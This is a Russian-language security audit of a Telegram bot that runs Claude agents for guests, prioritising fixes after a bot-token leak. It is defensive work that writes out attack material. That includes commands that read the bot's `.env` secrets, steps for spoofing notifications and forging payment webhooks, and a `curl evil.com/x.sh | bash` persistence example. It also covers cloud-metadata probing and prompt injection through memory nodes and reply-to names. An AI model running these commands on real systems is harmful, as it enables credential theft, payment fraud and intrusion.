# Открытые уязвимости перед ротацией ключей

Дата: 2026-05-14
Источники: сверка трёх старых аудитов (2026-05-08, 2026-05-10, 2026-05-13) с актуальным кодом + findings от инцидента 2026-05-13 (утечка `TELEGRAM_BOT_TOKEN` через тестовый аккаунт Артём, 5615267984).

## Главный вывод

Корень утечки — **архитектурное решение**: `free.containerEnabled = false` в `src/types.ts:107`. 14 из 18 пользователей сейчас free-tier и работают **без Docker-контейнера**. Их Claude-subprocess запускается на хосте под root (systemd-юнит = root).

`process.env` бота **не утекает** в гостевую сессию — `buildGuestBaseEnv()` правильно отдаёт только PATH/HOME/TZ/LANG/LC_ALL/USER/LOGNAME (`src/config.ts:974-981`). Этот вектор закрыт.

Утечка произошла через **другой путь**: `checkCommandSafety` валидирует пути **только для `rm`**. Команды типа `cat /opt/claude-tg-bot/.env`, `head`, `printenv`, `env` проходят без проверки. Поскольку Claude работает как root на хосте — `cat` читает любой файл. Подтверждение: `src/security.ts:135-200`, ветка `if (firstBin === "rm")` единственная, где идёт проверка `isPathAllowedFor`.

`Read`-tool путь блокируется (`isPathAllowedFor` в `session.ts:962-984`). А `Bash` — нет.

---

## Открытые дыры по приоритету

### 🔴 P0 — критичные дыры, до ротации ключей

#### V--2. notify-bridge source-IP проверка не работает в Bun (CRITICAL)

- **Где:** `src/dashboard-server.ts:739-742` (notify-bridge на 3849)
- **Что:** код использует `(req as any).remoteAddress` для получения IP. **В Bun на объекте `Request` этого поля нет** — он undefined → fallback на `X-Forwarded-For`, который **легко подделать** из контейнера. Проверка «source IP в guest subnet» де-факто не работает.
- **Эксплуатация:**
  1. Гость A в контейнере (172.18.0.2) шлёт `POST http://172.18.0.1:3849/notify` с заголовком `X-Forwarded-For: 172.18.0.3` (IP гостя B) и `userId: <B_id>`.
  2. Notify-bridge думает что запрос от контейнера B, проверка docker inspect IP=172.18.0.3 → matches B → ОК.
  3. Бот шлёт сообщение от Telegram-бота юзеру B с произвольным content от имени A.
- **Опасность:** **CRITICAL**. Спам от имени бота юзерам, phishing, manipulation.
- **Фикс:** в Bun использовать `server.requestIP(req)` (нативный API). Пример:
  ```ts
  Bun.serve({
    port: NOTIFY_BRIDGE_PORT,
    async fetch(req, server) {
      const sourceIp = server.requestIP(req)?.address ?? "";
      // НЕ читать X-Forwarded-For вообще
      if (!sourceIp.startsWith(GUEST_SUBNET_PREFIX)) return new Response("Forbidden", { status: 403 });
      // ...
    }
  });
  ```
- **Источник:** `raw/21` INT-01.

#### V--1. `system/users.json` в git history (CRITICAL)

- **Где:** `/Users/evgeniy/projects/claude-tg-bot/.gitignore` (нет строки `system/users.json`); git log показывает 6+ коммитов с этим файлом (`346f5b9`, `e3fc11e`, `d1b5c41`, `769810c`, `92f0506`, `7dc41a2`).
- **Что:** в users.json лежат **payment_method_id** YooKassa, Telegram ID всех пользователей, subscription_expires, trial_used, label, invited_by. Всё это в git history — **необратимо**, даже если сейчас удалить.
- **Опасность:** payment_method_id — токен карты YooKassa, с которым можно делать рекуррентные списания (если ключ магазина утёк через V-01). Если репозиторий приватный, но имеет копии (бекапы, jinru-сервер, локалки) — данные уже разлились.
- **Фикс:**
  1. Срочно: добавить `system/users.json` в `.gitignore`.
  2. Удалить из git history: `git filter-repo --path system/users.json --invert-paths` (BFG-Repo-Cleaner аналог); force-push в remote если есть.
  3. `chmod 600 /opt/claude-tg-bot/system/users.json` на проде.
  4. Перевыпустить payment_method_id если возможно (вряд ли — обратиться в YooKassa) или перевыпустить ключ магазина.
- **Источник:** `raw/15` SC-00 + ручная проверка `git log`.

#### V-00. YooKassa webhook принимает фейк от любого IP (CRITICAL)

- **Где:** webhook-обработчик YooKassa (точная строка в `raw/04_payment_subscription.md` → P-01)
- **Что:** проверка IP-фильтра написана как `if (clientIp && !isYuKassaIp(clientIp))`. При пустой строке `clientIp` (или undefined) условие ложно → IP-фильтр **пропускает** запрос.
- **Эксплуатация:** любой в интернете может отправить `POST /webhook` с подделанным JSON `{"event":"payment.succeeded","object":{...}}` → бот активирует подписку без оплаты.
- **Опасность:** **CRITICAL**. Прямая бесплатная активация premium-тарифа. Также — потенциально активация чужому юзеру.
- **Фикс:** заменить условие на `if (!clientIp || !isYuKassaIp(clientIp))` (отказать при отсутствующем IP); добавить заголовок YooKassa-signature если их API подписывает; в идеале — webhook идёт через nginx → nginx ставит правильный `X-Real-IP`.

#### V-01. Free-tier гости имеют root на хосте через Bash

- **Где:** `src/types.ts:107` + `src/config.ts:1106` + `src/security.ts:135-200`
- **Симптом:** любой free-гость может выполнить `cat /opt/claude-tg-bot/.env` и получить все секреты бота.
- **Почему работает:**
  1. `TIER_CONFIGS.free.containerEnabled = false` → docker-контейнер не создаётся
  2. `config.ts:1106` принудительно ставит `containerEnabled: false` для free, даже если в `users.json` стоит `true`
  3. `session.ts:557-559`: `useContainer = profile.containerEnabled && !isOwner` → для free `useContainer=false`
  4. `session.ts:959`: `if (toolName === "Bash" && !useContainer)` → проходит `checkCommandSafety`
  5. `checkCommandSafety` проверяет пути только для `rm`. `cat`, `head`, `printenv`, `env`, `less`, `xxd`, `od`, `dd if=`, `cp`, `tail`, `strings`, `grep` (с файлом-аргументом) — все проходят
  6. Claude работает как root → читает что угодно
- **Опасность:** **CRITICAL**. Все 14 free-юзеров могут повторить утечку. Кроме токенов утечь могут: `system/users.json` (PII + payment_method_id YooKassa), `metering.sqlite`, исходный код, `/root/.claude/.credentials.json` (Anthropic OAuth), приватные ключи SSH в `/root/.ssh/`.
- **Решение пользователя:** **Вариант B** — free-tier получает только текстовый чат, без файловых/shell-инструментов.
- **Что отключить в `disallowedTools` для free:**
  - Built-in: `Bash`, `BashOutput`, `KillShell`, `Read`, `Write`, `Edit`, `MultiEdit`, `Glob`, `Grep`, `NotebookEdit`
  - MCP: `mcp__container__Bash`, `mcp__send-file__*` (нечего слать), `mcp__pollinations-image__*` (тоже файлы), `mcp__connect-google__*`
  - Оставить: `mcp__ask-user__*` (просто кнопки) — безопасно
- **Изменение архитектуры:** free превращается в чисто-разговорного ассистента. Это меняет позиционирование тарифа — фиксируется в memory как продуктовое решение.

---

### 🟠 P1 — закрыть в этом же пакете

#### V-1A. YooKassa webhook: нет дедупликации по `payment.id`

- **Где:** см. `raw/04_payment_subscription.md` → P-02
- **Что:** YooKassa спокойно делает retries при 5xx/timeout. Бот при повторном webhook второй раз добавляет `SUBSCRIPTION_DAYS` к `subscription_expires`.
- **Эксплуатация:** платёж 1 раз → 2 retries → 3 × подписка. Либо сам атакующий: один валидный платёж → 10 раз постит webhook с тем же JSON → 10×.
- **Фикс:** хранить таблицу processed `payment.id` в SQLite, проверять перед обработкой. На retry — вернуть 200 без побочного эффекта.

#### V-1B. `users.json` и `metering.sqlite` мировые `644`

- **Где:** на проде `/opt/claude-tg-bot/system/users.json`, `/opt/claude-tg-bot/metering.sqlite`
- **Что:** права позволяют любому пользователю на хосте прочитать. В сочетании с V-01 — free-гость через `cat` сливает PII всех пользователей и финансовые данные.
- **Фикс:** `chmod 600` на оба файла; убедиться что бот запускается под root (он и так root, чтение пройдёт).

#### V-1C. Voice/audio без лимита размера → Whisper биллинг-DoS

- **Где:** см. `raw/05_handler_pipeline.md` → H-04
- **Что:** handler принимает любой размер voice/audio, шлёт в OpenAI Whisper. 25 MB лимит у Telegram, но 25 MB voice = ~2 часа аудио → $0.36 за один запрос.
- **Эксплуатация:** free-гость спамит 100 длинных voice = $36. С банального аккаунта легко слить $$$ на Whisper.
- **Фикс:** жёсткий лимит длительности (например 5 мин для free, 30 для paid) до отправки в Whisper. Опционально — отказать в voice для free.

#### V-1D. Bun-сервера биндятся на `0.0.0.0`

- **Где:** `src/dashboard-server.ts:603` (port 3848), `src/dashboard-server.ts:728` (port 3849 notify-bridge), `src/index.ts:409` (port 3847 health)
- **Что:** все три Bun-сервера слушают на `0.0.0.0`. UFW сейчас защищает (открыты только 22/80/443), но bind в обход TLS на внешний интерфейс — antipattern.
- **Опасность:** MEDIUM (UFW спасает), но defense-in-depth требует bind на `127.0.0.1`.
- **Фикс:** добавить `hostname: "127.0.0.1"` в каждый `Bun.serve({...})`. notify-bridge ещё нужно сделать слушающим на guest-bridge IP (`172.18.0.1` или динамически).

#### V-02. Memory-graph injection в system prompt (PARTIAL)

- **Где:** `src/memory/inject.ts:6-16`, `src/memory/graph.ts:45`
- **Что:** `sanitizeForPrompt` обрезает 500 симв, чистит markdown-заголовки, `SYSTEM:`, `INST:`. Но `node.type` идёт в `typeLabels` без zod-валидации; HTML-символы (`<`, `>`) не экранируются.
- **Опасность:** MEDIUM. Гость может через `/remember` или ask-user (если когда-то расширим) залить узел графа со зловредным content, потом этот content попадает в system prompt при последующем запросе.
- **Фикс:** zod-схема для узлов графа; добавить HTML-экранирование в `sanitizeForPrompt`.

#### V-03. Audit log в plain-text — log injection

- **Где:** `src/utils.ts:45`, прод `.env` (нет `AUDIT_LOG_JSON=true`)
- **Что:** plain-text формат, многострочный `content` ломает структуру лога; пользователь может вставить фейковые строки.
- **Опасность:** MEDIUM. Не приводит к утечке, но мешает разбору инцидентов.
- **Фикс:** включить `AUDIT_LOG_JSON=true` в `.env` (одна строка).

#### V-04. `dash.proboi.site` сломан из-за `X-Frame-Options: DENY`

- **Где:** `scripts/nginx/snippets/security-headers.conf:3`
- **Что:** глобальный заголовок `X-Frame-Options: DENY` блокирует Telegram Mini App iframe. **Дашборд не работает ни у кого.**
- **Опасность:** не security в строгом смысле, но функциональный блокер. Чинить в этом же пакете, раз всё равно правим.
- **Фикс:** убрать заголовок из общего сниппета или переопределить в location `/dashboard`.

#### V-05. `pdftotext` запускается на хосте без контейнера

- **Где:** `src/handlers/document.ts:227`
- **Что:** poppler парсит PDF от любого пользователя на хосте. Уязвимый PDF (CVE в poppler) → выход за песочницу нет, но **процесс бота может крашнуться** или утечь память.
- **Опасность:** MEDIUM. Не RCE из коробки, но bot crash при специально сделанном PDF от любого free-юзера.
- **Фикс:** перенести `pdftotext` в гостевой контейнер (через `mcp__container__Bash`). Если free без контейнера — отказывать в PDF обработке для free.

#### V-06. `python3 -c ${script} ${filePath}` через `Bun.$` в document.ts

- **Где:** `src/handlers/document.ts` (ID #35 из 10-мая)
- **Что:** template literal в shell-команде. Хотя пути санитизируются, паттерн опасен для будущих правок.
- **Опасность:** LOW сейчас, MEDIUM как паттерн.
- **Фикс:** перейти на `execFile`-стиль (массив аргументов).

---

### 🟠 P1 (доп.) — из третьего раунда (контейнеры/state/races)

#### V-20. Disk-IO лимиты молча игнорируются на cgroup v2

- **Где:** `src/containers/spec.ts` (`--blkio-weight`, `--device-write-bps`)
- **Что:** прод работает на cgroup v2. Все blkio-флаги Docker'а — это cgroup v1. На v2 они **silent no-op**: `docker inspect` показывает blkio=0 для всех гостей. **Нет лимита на запись/чтение диска.**
- **Эксплуатация:** платный гость в контейнере делает `dd if=/dev/zero of=/opt/vault/<id>/x bs=1M count=10000` → 10 GB на NVMe-скорости. IO-голод для бота и других гостей.
- **Фикс:** перейти на cgroup v2 io controller через systemd-slice (`IOReadBandwidthMax`, `IOWriteBandwidthMax`) или сменить cgroup driver Docker на `cgroupfs`. Источник: `raw/10` HIGH-01.

#### V-21. Inter-container lateral movement в `claude-guest-net`

- **Где:** docker network `claude-guest-net` без `--icc=false`
- **Что:** гость A на 172.18.0.2 может `curl http://172.18.0.3:80/` → читать веб-сервер гостя B. Системный промпт явно разрешает гостям запускать веб-сервера → port:80 typical. DOCKER-USER блокирует только хостовые порты, не inter-container.
- **Эксплуатация:** Гость A может найти соседей через `nmap 172.18.0.0/16` (если есть в образе) и читать их файлы через nginx.
- **Фикс:** `iptables -I DOCKER-USER 1 -i claude-guest0 -o claude-guest0 -j DROP` или `--icc=false` в daemon.json. Источник: `raw/10` HIGH-02.

#### V-22. Hetzner metadata 169.254.169.254 доступен из гостей

- **Где:** iptables FORWARD/DOCKER-USER (был фикс по `raw/02` HIGH #9, но он не покрывает контейнеры на claude-guest-net)
- **Что:** `docker exec claude-user-X curl http://169.254.169.254/hetzner/v1/metadata` → возвращает instance-id, hostname, public-ipv4, SSH public-keys, vendor_data. IMDSv1 — нет токенов, но есть инфра-fingerprint.
- **Фикс:** `iptables -I DOCKER-USER 1 -s 172.18.0.0/16 -d 169.254.169.254 -j DROP` + персистнуть в `scripts/firewall/docker-user-rules.sh`.

#### V-23. `parallel_mcp` без server-side `maxItems` → fan-out атака

- **Где:** `parallel_mcp/server.ts` (нет проверки `tasks.length <= 10`)
- **Что:** JSON Schema `maxItems: 10` объявлен, но MCP SDK не всегда валидирует. Гость передаёт 50 подзадач → 50× DeepSeek-запросов → x10 биллинг владельца на один user-запрос. Финансовый DoS.
- **Фикс:** в обработчике `mcp__parallel__run` явная проверка `if (tasks.length > 10) throw new Error("max 10 tasks")`. Источник: `raw/11` RACE-01.

#### V-24. Vault quota TOCTOU + нет docker storage limit

- **Где:** `src/containers/vault-quota.ts` (60-секундный кеш) + `src/containers/spec.ts` (нет `--storage-opt size=`)
- **Что:** в окно 60 секунд между обновлениями кеша гость пишет в vault через bind-mount `dd of=/opt/vault/<id>/big bs=1M count=20000` → quota не проверяется → 20 GB. Bind-mount не имеет storage limit.
- **Фикс:** добавить `--storage-opt size=3g` (или лимит на bind-mount через xfs/ext4 quota); сократить TTL кеша до 5 секунд; рассмотреть real-time quota через inotify. Источник: `raw/11` RACE-03.

#### V-25. `.daemons.yaml` как vector for malicious persistence

- **Где:** `scripts/daemon-runner/main.go` + `~/.daemons.yaml` в vault
- **Что:** гость прописывает в `.daemons.yaml` enabled-daemon с произвольной командой — например `curl evil.com/x.sh | bash`. Runner запускает при каждом старте контейнера без `checkContainerCommandSafety`. **Контейнер запускает arbitrary code от UID 1000.**
- **Опасность:** MEDIUM. Само по себе ограничено контейнером, но в комбинации с V-21 (inter-container) или V-22 (metadata) — серьёзный плацдарм.
- **Фикс:** валидировать `cmd` каждого daemon через `checkContainerCommandSafety` перед стартом; запретить shell-конструкции (pipe, `&&`) в YAML. Источник: `raw/11` RACE-07.

#### V-26. Нет userns-remap → container UID == host UID

- **Где:** `/etc/docker/daemon.json` (нет `userns-remap`)
- **Что:** `UsernsMode: ""` в docker inspect. UID 1000 в контейнере = UID 1000 на хосте. При container escape (любой kernel CVE) гость получает host UID 1000, который имеет read-доступ ко всем `/opt/vault/*/` (все vault'ы `1000:1000`). **Эскейп одного гостя = читать всех остальных.**
- **Фикс (defense-in-depth):** включить `userns-remap` или сменить vault permissions на `750` с уникальным UID per user. Источник: `raw/10` MEDIUM-02.

---

### 🟠 P1 (доп.) — из 4-го раунда (nginx/OAuth/supply-chain)

#### V-30A. Нет CSP на `/u/<id>/` → XSS на shared origin с dashboard

- **Где:** nginx vhost для `/u/` location
- **Что:** гостевой HTML отдаётся как `text/html` без CSP. JavaScript из этой страницы выполняется на том же origin `proboi.site` что dashboard. Атакующий гость кладёт в `~/public/index.html` JS, делает шортлинк жертве (или просто публикует), JS делает запрос к `/dashboard/api/me` с cookie сессии жертвы → утечка её dashboard-данных.
- **Опасность:** HIGH. Не cross-domain, потому что dashboard на `dash.proboi.site`. **Проверить:** dashboard действительно на subdomain или на том же domain что `/u/`? Если разные origins — CORS защищает, и это понижается. Если один origin — критично.
- **Фикс:** добавить `add_header Content-Security-Policy "default-src 'self'; script-src 'none'" always;` в location `/u/`; либо отдавать `/u/` с другого subdomain (`u.proboi.site`).
- **Источник:** `raw/12`.

#### V-30B. TLS 1.0/1.1 включены

- **Где:** nginx или OS-default ciphers
- **Что:** клиенты могут подключиться через TLS 1.0/1.1 (deprecated, уязвимы к BEAST, CRIME, POODLE).
- **Фикс:** в `nginx.conf` или vhost: `ssl_protocols TLSv1.2 TLSv1.3;`.
- **Источник:** `raw/12`.

#### V-30C. Rate-limit на `/api/` и `/webhook` рассинхрон prod vs репо

- **Где:** в репо `scripts/nginx/snippets/rate-limiting.conf` есть, но на проде `/etc/nginx/sites-enabled/` может быть устаревший конфиг.
- **Что:** реальный nginx на проде НЕ применяет rate-limit к `/api/` (по словам агента 4-го раунда). Webhook — то же.
- **Фикс:** перечитать `nginx -T` на проде, синхронизировать `/etc/nginx/sites-enabled/proboi.site.conf` с репо; `nginx -t && systemctl reload nginx`.
- **Источник:** `raw/12`.

#### V-30D. `design.proboi.site` без аутентификации

- **Где:** nginx vhost
- **Что:** если этот subdomain открыт публично без auth — может быть утечка чего-то админского.
- **Фикс:** проверить vhost, добавить `basic_auth` или закрыть совсем если не нужно.
- **Источник:** `raw/12`.

#### V-30E. Composio OAuth ссылка перехватываемая

- **Где:** `connect_google_mcp` → callback URL Composio
- **Что:** атакующий социалкой получает ссылку OAuth жертвы → авторизует свой Google для жертвы (state validation Composio не привязан к нашему userId жёстко).
- **Опасность:** LOW. Требует социалки.
- **Источник:** `raw/13` O-01.

#### V-30F. `system/users.json` не в rsync exclude (только в комментарии CLAUDE.md)

- **Где:** rsync-команды в CLAUDE.md и `scripts/deploy-jinru.sh`
- **Что:** комментарий говорит «никогда не sync users.json», но физического `--exclude` в команде нет. Человеческая ошибка = wipe всех платных подписок.
- **Фикс:** добавить `--exclude 'system/users.json'` в обе команды. Источник: `raw/15` SC-06.

#### V-30G. Bun/Node устанавливаются через `curl | bash` без проверки

- **Где:** `scripts/bootstrap-proboi.sh`, `Dockerfile.user`
- **Что:** classic pipe-to-shell. Если bun.sh скомпрометирован — RCE при пересборке.
- **Фикс:** закрепить версию + SHA256. Источник: `raw/15` SC-02.

#### V-30I. Нет CSP на `/dashboard` (последний рубеж XSS)

- **Где:** `src/templates/user-dashboard.ts`, nginx `dash.proboi.site.conf`
- **Что:** dashboard сам не отдаёт CSP-заголовок. При любой будущей XSS-уязвимости (новая фича, ошибка в `esc()`) — атакующий код выполняется без ограничений.
- **Фикс:** добавить `Content-Security-Policy: default-src 'self'; script-src 'self' https://telegram.org; ...` в HTML `<meta>` ИЛИ в nginx vhost для `/dashboard`.
- **Источник:** `raw/16` F-04.

#### V-30J. `btnPublic.href = u.publicUrl` без проверки схемы

- **Где:** `src/templates/user-dashboard.ts`
- **Что:** `publicUrl` приходит из server response. Если хакнут сервер или ошибка кода — клик откроет `javascript:alert(...)`.
- **Фикс:** `if (!/^https?:\/\//.test(u.publicUrl)) return;` перед присвоением href.
- **Источник:** `raw/16` F-02.

#### V-30K. Caption > 1024 не обрезается → stale dropbox файл

- **Где:** `src/handlers/streaming.ts` `checkPendingSendFileRequests` или send_file_mcp
- **Что:** при caption > 1024 символов Telegram отказывает в отправке, dropbox-JSON остаётся в `/tmp`, vault gosти забивается мёртвыми файлами.
- **Фикс:** truncate caption до 1024 перед `sendDocument`. Источник: `raw/17` F-07.

#### V-30L. EP-03: editMessageText в voice без try/catch → uncaught

- **Где:** `src/handlers/voice.ts`
- **Что:** при потере чата (заблокировал бота) `editMessageText` бросает, exception не ловится, process upgrade fail. Источник: `raw/18` EP-03.
- **Фикс:** обернуть в try/catch с `.catch(() => {})`.

#### V-30M. OpenRouter metering без request-id dedup

- **Где:** `src/engines/openrouter.ts` (recordUsage вызовы)
- **Что:** на retry та же стоимость пишется дважды. Источник: `raw/18` EP-08.
- **Фикс:** добавить request-id в `recordUsage` + дедуп таблица.

#### V-30N. Audit log в `/tmp`, не append-only, никуда не шипуется

- **Где:** `/tmp/claude-telegram-audit.log` (по env `AUDIT_LOG_PATH`)
- **Что:** `/tmp` периодически чистится. Логи теряются при reboot. Если атакующий получит root (через V-01) — затрёт audit-log своих действий. Никаких внешних копий нет.
- **Фикс:** переместить в `/var/log/claude-tg-bot.audit.log` (уже там! двойная) + `chattr +a` (append-only) + регулярный шиппинг в S3/Bx.
- **Источник:** `raw/19`.

#### V-30O. Нет алертов на подозрительное / на дневной спенд / на failed-auth

- **Где:** `src/owner-alerts.ts` (вызовы), `audit-log` парсинг
- **Что:** нет реал-тайм нотификаций когда:
  - гость пишет `cat /etc/`, `wget`, `curl` подозрительные команды
  - неавторизованный userId долбится на бота
  - дневной спенд per user > $X
  - YooKassa webhook отклонён по IP (только `console.warn`)
- **Фикс:** простая функция alerting + регулярный (раз в минуту) tail audit-log на паттерны.
- **Источник:** `raw/19`.

#### V-31. Paid → expired = немедленный host-Bash (активирует V-01)

- **Где:** `src/config.ts` `getUserProfile` + проверка tier на каждом запросе
- **Что:** при истечении подписки tier из `paid` становится `free` динамически (на следующем `getUserProfile`). Контейнер сразу не удаляется, но в session.ts `useContainer = profile.containerEnabled && !isOwner` → теперь false для free → built-in Bash включается. Бывший paid получает то же что Артём.
- **Опасность:** **HIGH**. Любой просроченный paid юзер становится root на хосте.
- **Фикс:** связан с V-01 — после фикса V-01 (free=без Bash) этот вектор тоже закроется. До фикса V-01 — следить, чтобы при downgrade tier контейнер не удалялся хотя бы 7 дней (так оно сейчас работает или нет — проверь).
- **Источник:** `raw/22`.

#### V-32. deleteUser/forget не чистят полностью

- **Где:** `src/user-registry.ts` `deleteUser`, `src/handlers/commands.ts` `/forget`
- **Что:**
  - `deleteUser` не удаляет `/opt/vault/<id>/`, контейнер `claude-user-<id>`, openrouterKey, dropbox-файлы в `/tmp/telegram-bot/<id>/`.
  - `/forget` удаляет только memory root, оставляя vault — GDPR-риск.
- **Фикс:** написать `cleanupUserResources(userId)` и вызывать из `deleteUser` и `/forget`.
- **Источник:** `raw/22`.

#### V-33. `session.kill()` не сбрасывает pendingPlan + pendingContextMessages

- **Где:** `src/session.ts`
- **Что:** при `/stop` или kill subprocess висят in-memory структуры. Следующий запрос юзера получит остатки от прерванного.
- **Фикс:** `this.pendingPlan = null; this.pendingContextMessages = [];` в `kill()`.
- **Источник:** `raw/22`.

#### V-34. `/api/me` и `/api/admin/all` без rate-limit + docker stats subprocess DoS

- **Где:** `src/dashboard-server.ts`
- **Что:** каждый запрос форкает `docker stats` (для метрик контейнеров). Без rate-limit любой авторизованный юзер может зафлудить эндпоинт → fork-bomb.
- **Фикс:** добавить per-userId rate-limit (например 10/мин) + кешировать `docker stats` 30 секунд.
- **Источник:** `raw/21` INT-07.

#### V-30P. Нет внешнего watchdog (healthz внутренний)

- **Где:** `src/index.ts` port 3847 health-webhook
- **Что:** если бот висит в deadlock, никто извне не уведомит. Внешний uptime-check (UptimeRobot, Healthchecks.io) отсутствует.
- **Фикс:** настроить free-tier UptimeRobot на `https://proboi.site/healthz` (через nginx proxy).
- **Источник:** `raw/19`.

#### V-30H. `claude-user-sandbox:latest` локальный без digest pinning

- **Где:** `src/containers/paths.ts`
- **Что:** уже было в V-19 как `:latest`, но дополнительно — образ локальный, любой с docker.sock может его пересобрать. С V-01 free-гость может выполнить `docker build` (если docker.sock есть на хосте — нет, бот не в Docker, но V-01 даёт root).
- **Фикс:** запинить digest в `paths.ts`. Источник: `raw/15` SC-03.

---

### 🟠 P1 (доп.) — из новых аудитов

| ID | Файл | Суть | Источник |
|---|---|---|---|
| V-1E | webhook handler | XFF-bypass IP-фильтра при добавлении nginx-проксирования | `raw/04` P-03 |
| V-1F | webhook handler | `users.json` редактируем через AI если V-01 обходится | `raw/04` P-04 |
| V-1G | `src/handlers/document.ts:157` | path traversal через `file_name=".."` (санитизация есть, но проверить ещё раз) | `raw/05` H-01 |
| V-1H | `/tmp/pollinations/` | shared между всеми гостями — cross-user чтение картинок | `raw/06` M-03 |
| V-1I | `parallel_mcp/server.ts:162` | `task.cwd` от модели без проверки против `allowedPaths` (усиливает V-01) | `raw/06` M-04 |
| V-1J | reply-to context | prompt-injection через `reply_to.from.first_name` | `raw/05` H-02 |

---

### 🟡 P2 — можно отложить (не блокирует ротацию ключей)

| ID | Файл | Суть | Severity |
|----|------|------|----------|
| V-29 | `src/session.ts:1393-1433` | resume-hijack: sessionId не проверяется на принадлежность userId (но эксплуатация требует V-01) | HIGH |
| V-30 | `src/memory/analyzer.ts:113-123` | prompt-injection через транскрипт → запись в граф пользователя через analyzer | MEDIUM |
| V-31 | `src/handlers/streaming.ts` | `IdleHeartbeat` таймеры не `unref()` — exception до cleanup = таймер живёт | MEDIUM |
| V-32 | `src/index.ts` или `src/session.ts` | `runningPromise` теряется при рестарте — пользователь не уведомляется о потерянном запросе | MEDIUM |
| V-33 | `src/index.ts` invite-approve | race-окно при approve→restart в users.json | MEDIUM |
| V-34 | `src/handlers/callback.ts` `task_confirm` | callback принимает `taskId` без per-user scope (`assignedTo` в файле — единственная защита) | MEDIUM |
| V-35 | `src/dashboard-server.ts` notify-bridge | `_allowedUsers` Set строится один раз — новые approve'ы не подхватываются до рестарта | LOW |
| V-36 | `src/engines/openrouter.ts` vision | нет daily-лимита на vision-запросы (per-user) → экономический DoS | MEDIUM |
| V-37 | `src/utils.ts` writeAuditLog | `appendFile` не атомарен для записей > 4096 байт | LOW |
| V-38 | `src/crashloop-watcher.ts` | гость через переименование daemon сбрасывает 1-часовой кулдаун алертов | LOW |
| V-39 | `src/request-queue.ts` `acquireContainerSlot` | stale resolver при таймауте может занижать счётчик активных сессий | LOW-MEDIUM |
| V-07 | `src/handlers/audio.ts:218-235` | `releaseContainerSlot` нет общего try/finally — слот утечёт при synchronous throw | HIGH-reliability |
| V-08 | `src/session-registry.ts:38` | `/tmp/claude-active-users.json` теряется при reboot — нет restart-уведомлений | HIGH-reliability |
| V-09 | `src/containers/spec.ts:103-108` | Нет `--oom-score-adj` для бота → OOMkiller может убить бота вместо контейнера | HIGH-reliability |
| V-10 | `src/containers/manager.ts:634-649` | `ensureDocker` кэширует true навсегда — рестарт dockerd → ложно «Docker недоступен» | HIGH-reliability |
| V-11 | `src/containers/manager.ts:176-190` | `init()` revive sequential → 10 always-on юзеров × 30s = 5 мин старт | HIGH-reliability |
| V-12 | `scripts/daemon-runner/main.go:157-161` | Зомби при ошибке `openLog` | MEDIUM |
| V-13 | `scripts/firewall/egress-reset.sh:18` | `tc filter del` без фильтра по chain — сносит все фильтры | MEDIUM |
| V-14 | `src/security.ts` `BLOCKED_PATTERNS` | Не покрыто `curl \| sh`, `wget \| sh`, `node -e` | PARTIAL |
| V-15 | `src/handlers/audio.ts` | Расширение из `audio.file_name` без whitelist | OPEN |
| V-16 | `src/handlers/callback.ts` | `requestId` без формат-валидации; legacy `/tmp/ask-user-${requestId}.json` fallback мёртвый, но не удалён | OPEN |
| V-17 | `src/owner-alerts.ts` | `OWNER_PROBLEM_CHANNEL_ID` без валидации | OPEN |
| V-18 | `Dockerfile.user:9-12` | `nginx`, `openssh-client`, `rsync`, `procps`, `lsof` в образе без необходимости — поверхность атаки | LOW |
| V-19 | `src/containers/paths.ts:10` | Тег `:latest` без SHA256 digest | LOW |
| V-20 | `Dockerfile.user` | Multi-stage build не добавлен | LOW |
| V-21 | `/etc/systemd/system/claude-tg-bot.service` | Нет `MemoryMax`/`TasksMax` | LOW |
| V-22 | `send_file_mcp/server.ts` | `Bun.file().size === 0` false-positive | OPEN |
| V-23 | `src/handlers/commands.ts` | `/retry` fakeCtx с чужим типом чата | LOW |
| V-24 | `src/handlers/streaming.ts` | `unlinkSync` до доставки файла | LOW |
| V-25 | `src/handlers/text.ts` | Reply-to контекст до `isAuthorized` | LOW |
| V-26 | `src/memory/graph.ts` | `label_index` без cap | LOW |
| V-27 | `src/dashboard-server.ts` | `getAllUsersTotals()` не пагинирован | LOW |
| V-28 | `scripts/nginx/sites-available/dash.proboi.site.conf:27` | Глобальный `client_max_body_size 50M` | PARTIAL |

---

## Резюме

**Перед ротацией ключей закрыть:**
- 🔴 **P0 (3):** V--1 (users.json в git), V-00 (YooKassa IP-bypass), V-01 (free → root через Bash)
- 🟠 **P1 базовые (5):** V-02..V-06 (memory-graph, audit-log JSON, X-Frame, pdftotext на хосте, document.ts shell-pattern)
- 🟠 **P1 из 2-го раунда (10):** V-1A..V-1J
- 🟠 **P1 из 3-го раунда (7):** V-20..V-26 (контейнеры/cgroup/network)
- 🟠 **P1 из 4-го раунда (8):** V-30A..V-30H (CSP, TLS, rate-limit, design, OAuth, rsync, install hardening, image pinning)
- 🟠 **P1 из 5-го раунда (8):** V-30I..V-30P (dashboard CSP, href scheme, caption truncate, voice editMessage catch, OR dedup, audit-log hardening, alerts, watchdog)
- 🟠 **P1 из 6-го раунда (4):** V-31..V-34 (paid-expire → free Bash, deleteUser cleanup, session.kill pendingPlan, /api docker stats DoS)

**V-07..V-39 (P2):** reliability/мелочи, не блокируют. Отдельная сессия.

**После всего пакета:** ротировать TELEGRAM_BOT_TOKEN, OPENAI_API_KEY, OPENROUTER_API_KEY, DEEPSEEK_API_KEY, COMPOSIO_API_KEY. Заменить в `.env` на проде через ssh (НЕ rsync). Рестарт.

## Закрыто после проверки (не правим)

- **H-02 SSH-ключ `artemyasuoko@gmail.com`** — это ключ владельца Евгения, не атакующего (email совпадает с настройкой userEmail). Снято.
- **H-04 порт 3849** — это `notify-bridge` для гостевых контейнеров → Telegram. Легитимный сервис с многоуровневой защитой (source IP в guest subnet, userId в allowed, IP контейнера matches userId, rate-limit 20/мин). Не задокументирован в CLAUDE.md — добавить.
- **3849 публичный доступ** — UFW блокирует (открыты только 22/80/443), внешний `curl` дропается. Bind на 0.0.0.0 = antipattern, но не дыра.

## Что НЕ открыто (закрыто, не трогаем)

- Утечка через `process.env` гостевого subprocess — закрыто `buildGuestBaseEnv()`.
- `send_file` MCP без проверки путей — закрыто `realpathSync` + `isPathAllowedFor`.
- `parallel_mcp` без sandbox — закрыто прокидыванием `TELEGRAM_PARALLEL_*` env.
- `/proc/1/root` эскейп — закрыто `--user=1000:1000` (для тех, у кого контейнер).
- `mcp__container__Bash` без safety check — закрыто `checkContainerCommandSafety`.
- Тайминг-атака HMAC дашборда — закрыто `timingSafeEqual`.
- Hetzner metadata 169.254.169.254 — DROP добавлен.
- Composio key в env гостя — убран.
- Все 5 critical из audit-out/zone-2 + zone-3.
